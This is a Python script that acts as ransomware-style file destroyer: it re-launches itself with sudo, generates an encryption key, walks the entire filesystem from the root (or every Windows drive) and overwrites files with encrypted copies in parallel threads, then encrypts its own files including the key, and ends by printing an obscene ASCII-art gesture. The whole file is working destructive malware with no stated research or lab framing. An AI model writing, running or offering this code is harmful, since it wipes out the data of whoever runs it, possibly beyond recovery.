#!/usr/bin/env python3

import os
import sys
import subprocess
import platform
import logging
import signal
import time
import psutil  # New import for dynamic resource handling
from cryptography.fernet import Fernet
from concurrent.futures import ThreadPoolExecutor, as_completed

# Setup logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s',
                    handlers=[
                        logging.StreamHandler()
                    ])

# Function to check and relaunch with elevated permissions
def check_and_relaunch():
    if platform.system() == "Linux" and os.geteuid() != 0:
        logging.info("Script is not running as root. Re-launching with sudo...")
        try:
            subprocess.run(['sudo', 'python3'] + sys.argv)
            sys.exit(0)
        except Exception as e:
            logging.error(f"Failed to relaunch script with sudo: {e}")
            sys.exit(1)

    elif platform.system() == "Windows":
        logging.info("Script is not running with administrative privileges. Please run as an administrator.")
        sys.exit(1)

check_and_relaunch()

# Generate encryption key
key = Fernet.generate_key()
with open("thekey.key", "wb") as key_file:
    key_file.write(key)

# Exclude specific files and directories
EXCLUDE_FILES = {"main.py", "thekey.key", "decrypt.py"}

# Get the Python environment path
python_env_path = os.path.dirname(os.path.dirname(sys.executable))

# Get the Node.js environment path managed by nvm
nvm_path = os.path.expanduser("~/.nvm")

# Get the Ruby environment path managed by rvm
rvm_path = os.path.expanduser("~/.rvm")

# Get common system paths to exclude
system_paths = [
    "/usr/share",
    "/var/log",
    "/dev",
    "/sys",
    "/proc",  # Added to prevent freezing
    "/usr/lib",
    "/usr/local/python",
    "/usr/local/python3",
    "/usr/local/py-utils",
    "/usr/local/php",
]

# Function to encrypt a file
def encrypt_file(file_path, exclude_paths):
    if any(file_path.startswith(exclude) for exclude in exclude_paths):
        logging.debug(f"Skipping system path file {file_path}")
        return
    try:
        with open(file_path, "rb") as file:
            data = file.read()
        encrypted_data = Fernet(key).encrypt(data)
        with open(file_path, "wb") as file:
            file.write(encrypted_data)
        logging.info(f"Encrypted {file_path}")
    except Exception as e:
        logging.error(f"Failed to encrypt {file_path}: {e}")

# Function to get all files from a root directory
def get_all_files(root_dir, exclude_paths):
    for root, _, files in os.walk(root_dir):
        if any(os.path.commonpath([root, exclude]) == exclude for exclude in exclude_paths):
            logging.debug(f"Skipping directory {root}")
            continue
        for file in files:
            file_path = os.path.join(root, file)
            if os.path.basename(file_path) in EXCLUDE_FILES or any(os.path.commonpath([file_path, exclude]) == exclude for exclude in exclude_paths):
                logging.debug(f"Skipping file {file_path}")
                continue
            yield file_path

# Function to process files in chunks
def process_files_in_chunks(files, chunk_size=10):
    while True:
        chunk = []
        try:
            for _ in range(chunk_size):
                chunk.append(next(files))
        except StopIteration:
            if chunk:
                yield chunk
            break
        yield chunk

# Signal handler for bus errors
def bus_error_handler(signum, frame):
    logging.error("Bus error (signal %d). Continuing..." % signum)
    time.sleep(1)

signal.signal(signal.SIGBUS, bus_error_handler)

# Encrypt files in chunks
def encrypt_files_in_chunks(root_dir, exclude_paths, chunk_size=10):
    all_files = get_all_files(root_dir, exclude_paths)
    for chunk in process_files_in_chunks(all_files, chunk_size):
        # Dynamic handling of memory and CPU
        available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
        cpu_usage = psutil.cpu_percent(interval=1)
        logging.debug(f"Available memory: {available_memory:.2f}%, CPU usage: {cpu_usage:.2f}%")
        if available_memory < 20:  # If available memory is less than 20%
            logging.warning("Low memory. Pausing encryption for 5 seconds...")
            time.sleep(5)

        with ThreadPoolExecutor() as executor:
            futures = [executor.submit(encrypt_file, file, exclude_paths) for file in chunk]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logging.error(f"Error processing a file: {e}")

# Main function
def main():
    root_dirs = ["/"] if platform.system() != "Windows" else [drive + ":\\" for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(drive + ":\\")]
    exclude_paths = [
        os.path.abspath(python_env_path),
        os.path.abspath(os.path.dirname(__file__)),
        os.path.abspath(nvm_path),
        os.path.abspath(rvm_path),
    ]
    
    # Dynamically add system paths
    exclude_paths.extend([os.path.abspath(path) for path in system_paths])
    logging.debug(f"Exclude paths: {exclude_paths}")
    
    for root_dir in root_dirs:
        encrypt_files_in_chunks(root_dir, exclude_paths)
    
    # Finally encrypt the current script
    for script in EXCLUDE_FILES:
        script_path = os.path.join(os.path.abspath(os.path.dirname(__file__)), script)
        if os.path.exists(script_path):
            encrypt_file(script_path, exclude_paths)

if __name__ == "__main__":
    main()










    bird = """

    ░░░░░░░░░░░░░░░▄▄░░░░░░░░░░░
    ░░░░░░░░░░░░░░█░░█░░░░░░░░░░
    ░░░░░░░░░░░░░░█░░█░░░░░░░░░░
    ░░░░░░░░░░░░░░█░░█░░░░░░░░░░
    ░░░░░░░░░░░░░░█░░█░░░░░░░░░░
    ██████▄███▄████░░███▄░░░░░░░
    ▓▓▓▓▓▓█░░░█░░░█░░█░░░███░░░░
    ▓▓▓▓▓▓█░░░█░░░█░░█░░░█░░█░░░
    ▓▓▓▓▓▓█░░░░░░░░░░░░░░█░░█░░░
    ▓▓▓▓▓▓█░░░░░░░░░░░░░░░░█░░░░
    ▓▓▓▓▓▓█░░░░░░░░░░░░░░██░░░░░
    ▓▓▓▓▓▓█████░░░░░░░░░██░░░░░
    █████▀░░░░▀▀████████░░░░░░


    """
    print(bird)

    